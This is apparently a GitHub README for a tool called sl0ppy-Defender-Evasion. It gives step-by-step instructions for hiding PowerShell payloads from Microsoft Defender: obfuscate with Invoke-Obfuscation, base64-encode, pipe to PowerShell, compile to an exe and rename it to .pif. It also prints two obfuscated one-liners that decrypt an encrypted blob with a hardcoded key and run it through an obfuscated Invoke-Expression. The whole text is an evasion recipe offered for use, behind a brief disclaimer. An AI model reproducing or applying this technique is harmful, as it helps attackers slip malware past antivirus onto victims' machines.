# sl0ppy-Defender-Evasion
Evasion of defender by x0r00t team sl0ppyr00t


# gif poc
![](https://github.com/x0xr00t/sl0ppy-defender-evasion/blob/main/pocbypassdefender.gif)

# needed 
* `psexec`
* `invoke Obfuscation` << (edit source to gen larger payload strings)
* `encrypt decrypt base64 ps` 
* `ps1`
* `rename file` 

# how to
* `put 'get-computerinfo' or any other paylaod to b.ps1, or use b64decode.ps1`
* `open obfuscator dir in ps and enter 'Import-Module ./Invoke-Obfuscation.psd1' & 'Invoke-Obfuscation'`
* `set scriptpath`
* `compress\1 encoding\5 encoding\5 encoding\5`
* `copy output and add "| powershell $()"`
* `copy full sting and convert to b64`
* `open b64deode.ps1 add on the end "| powershell $()"`
* `replace string b64 with the output of your b64 obfuscated payload` 
* `convert b64decode.ps1 to exe, or use the regular file b.ps1` 
* `open 'psexec.exe or run the ps1' and gen .exe from ps1 file 'set scriptpath C:\whatever/whatever.ps1' and output 'C:\whatever\'` 
* `rename .exe to sum.pif 'rename-Item -Path "sum.exe" -NewName "sum.pif"'`

# Extra info 
* `u can either use b64 in the beginning, or use it when the obfuscated code has been generated... `
* `i tested both, and both methods would work`
* `the b.pif that been made, has been generated with..>> obfuscated ps code converted to b64 before spinning out the exe` 

# generated file to evade defender.
* ` {!} b.pif`


# obfuscated ps code exec example
` ([RUNTiME.InTeROpserViCES.MaRShal]::ptRtoStriNGuNi([ruNtime.inteROpservIceS.MaRShAL]::securEsTRiNGTOglObaLallOcuNiCOde($('76492d1116743f0423413b16050a5345MgB8AE0AdwA3AGYAeABGAFcAYwBvAHIAUwB1ADUAQgArAFEASgBLAEUASwBpAHcAPQA9AHwAMgAyADEAYgAxAGYANAAzADAAMABmADYANABkAGUANAAyAGIANAA5ADIAYgBmAGUAYQBkADQAMgA2AGUANQBjAGMAMwAyAGUAZQAzAGEAOAAzADcAYgBiADgAMABiADMAOQAwADkAMQA3ADIAZQAzADAANgAxADYAZgA0AGUAOQBmADAAZgAyAGQAOAAwADUAZQBlADkANwAwADIANwAyADUAMwBmADAAMwA4ADEAOAA4ADYANQA1ADkAZQBkAGIAYwA3ADMAMABmADkANABmADIAZQA4AGQANgAzADcAMwAyAGMANQBjAGQAYgBjADcAYQAwADgAMwAxADUAYgAwAGIAMwAwADkANQBkADEANgA4ADIAOQAzADgAOABjADYAYQA1AGEANA<<<<snipped>>>>3AGIANQBiADYAMgA4ADEAZgA1ADIAMgAwADMAZgA1ADYAOQAyADYANgAyAGYAMgBlADIAMwA5ADgAMwAzAGQANQA1AGIANgA5ADAANAAyAGEAOQA2AGQANgA2ADEANwAzAGQAMQBiAGYAMABiADYAMQA0ADYAZQA5AGUAZgA0ADIANABlAGQANQA2AGIANQA1ADEAMgBkADMAZQA4AGEAMABlADgANwAzAGYAMgA0ADcAMQAxAGYAOABmADIAYQAxADgANAA5ADkAYwAwADYANgBiADAAOAA4AGEAYQBmADYANAA2ADMAYgBlADMAZAAzAGUAMAAzADQAYwAzADQAMwBhADEAYgBhAGEAYQA1AGMANQA1ADAAOAAzADUAYgBjAGYAMQA0ADIAMQBhAGUAOQA5AGIAMAA1AGYAYwBjAGQAMwA0AGQAMAA0ADgANwBiADEAYgBkADAAYwAwADgAOABiADUAZAA0AGYAMQA1AGMAYQA0ADgAYQAzAGMANQBmAGYAYgA3ADEAMwBjAGUAYQAwAGQAZQBjAGMAOQBkADMAOQA4ADIAZAA3ADUAZABjADcANABjADQAZQBkADIANAA2ADAANwA2ADUAMgAwADUANgA5ADIAYwBhADkAZQBmADkAYQAzADgAYQAyADkANgAyADEAYQBjADAAYgA3ADcAMAA2ADIANABiAA=='|cOnvERTTO-SEcurestRiNG -Ke  166,106,160,85,1,18,83,43,143,245,214,77,140,238,201,184)) ))| & ( $PSHOmE[4]+$PshOMe[34]+'x')`


#b.ps1 example
 `([RUNTiME.InTeROpserViCES.MaRShal]::ptRtoStriNGuNi([ruNtime.inteROpservIceS.MaRShAL]::securEsTRiNGTOglObaLallOcuNiCOde($('76492d1116743f0423413b16050a5345MgB8AE0AdwA3AGYAeABGAFcAYwBvAHIAUwB1ADUAQgArAFEASgBLAEUASwBpAHcAPQA9AHwAMgAyADEAYgAxAGYANAAzADAAMABmADYANABkAGUANAAyAGIANAA5ADIAYgBmAGUAYQBkADQAMgA2AGUANQBjAGMAMwAyAGUAZQAzAGEAOAAzADcAYgBiADgAMABiADMAOQAwADkAMQA3ADIAZQAzADAANgAxADYAZgA0AGUAOQBmADAAZgAyAGQAOAAwADUAZQBlADkANwAwADIANwAyADUAMwBmADAAMwA4ADEAOAA4ADYANQA1ADkAZQBkAGIAYwA3ADMAMABmADkANABmADIAZQA4AGQANgAzADcAMwAyAGMANQBjAGQAYgBjADcAYQAwADgAMwAxADUAYgAwAGIAMwAwADkANQBkADEANgA4ADIAOQAzADgAOABjADYAYQA1AGEANA<<<<snipped>>>>AzADIAZAAyADIANgBmAGMANgA4AGIAYgAzADkAOAAyAGUAZABjADcAMwAyADEAMwA1AGUAMgBiAGQANABkADgAYQA3ADUAMQAyADIAOAA5AGEAOABmAGQAYwA4AGQAZAA2AGYAMwA1AGEAOAAyAGMANABlADcAYgBhAGQAZAA5AGIAZAA0ADYAMQAxAGIAMwA1ADYAOQBhADgAZAA3ADgANwA1ADQAYgA1ADMAYwA1ADQAMgBiADgAMwAwADEAZgBiAGQANQBlADQAYgA3AGQAMgBlAGIAZABjAGMAMgA1ADcAMQBhADgAzADQAMwBhADEAYgBhAGEAYQA1AGMANQA1ADAAOAAzADUAYgBjAGYAMQA0ADIAMQBhAGUAOQA5AGIAMAA1AGYAYwBjAGQAMwA0AGQAMAA0ADgANwBiADEAYgBkADAAYwAwADgAOABiADUAZAA0AGYAMQA1AGMAYQA0ADgAYQAzAGMANQBmAGYAYgA3ADEAMwBjAGUAYQAwAGQAZQBjAGMAOQBkADMAOQA4ADIAZAA3ADUAZABjADcANABjADQAZQBkADIANAA2ADAANwA2ADUAMgAwADUANgA5ADIAYwBhADkAZQBmADkAYQAzADgAYQAyADkANgAyADEAYQBjADAAYgA3ADcAMAA2ADIANABiAA=='|cOnvERTTO-SEcurestRiNG -Ke  166,106,160,85,1,18,83,43,143,245,214,77,140,238,201,184)) ))| & ( $PSHOmE[4]+$PshOMe[34]+'x')| powershell $()`

# Youtube vid poc 
https://www.youtube.com/watch?v=oHOsRgMxlrs


# Legal Disclaimer: 
* I am not responsible for U using it on non authorized systems, make sure u use it on systems u own or are authorized on. 

* x0xr00t 
